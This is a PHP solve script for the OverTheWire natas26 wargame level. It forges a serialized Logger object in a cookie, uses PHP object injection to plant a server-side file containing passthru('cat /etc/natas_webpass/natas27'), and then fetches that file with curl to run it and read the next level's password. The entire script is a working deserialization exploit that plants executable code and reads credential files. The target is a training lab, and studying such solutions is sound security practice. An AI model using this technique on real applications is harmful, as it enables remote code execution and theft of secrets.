#!/usr/bin/php
<?php
if (count($argv) < 2) {
  echo "Please provide a password\n";
  exit;
}
$password=$argv[1];
$injectedfile="img/tellmeyoursecrets.php";
class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($file){
        // initialise variables
        $this->initMsg="";
        $this->exitMsg="The password for natas27 is <?php passthru('cat /etc/natas_webpass/natas27'); ?>\n";
        $this->logFile = $file;

        // write initial message
        $fd=@fopen($this->logFile,"a+");
        @fwrite($fd,@$initMsg);
        @fclose($fd);
    }

    function log($msg){
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$msg."\n");
        fclose($fd);
    }

    function __destruct(){
        // write exit message
        $fd=@fopen($this->logFile,"a+");
        @fwrite($fd,$this->exitMsg);
        @fclose($fd);
    }
}
$logger = new Logger($injectedfile);
$cookie = urlencode(base64_encode(serialize($logger)));
// Save file on server
echo "Created evil cookie\n";
echo "Send to website\n";
passthru("curl -s --user natas26:".$password.' -b "drawing='.$cookie.'" http://natas26.natas.labs.overthewire.org/ > /dev/null');
echo "Evil code is now on website. Let's run it.\n";
echo passthru("curl -s --user natas26:".$password." http://natas26.natas.labs.overthewire.org/".$injectedfile);
?>
